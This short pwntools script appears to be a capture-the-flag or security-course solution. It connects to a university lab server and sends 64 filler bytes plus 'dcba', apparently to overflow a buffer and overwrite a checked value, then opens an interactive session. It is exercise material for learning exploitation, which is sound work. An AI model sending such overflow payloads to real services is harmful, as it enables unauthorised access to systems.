from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25152

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./program/match', shell=True)

### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

input('')

# s.send(129 * b'a' + b'\n')
s.sendline(64 * b'a' + b'dcba' + b'\n')

s.interactive()
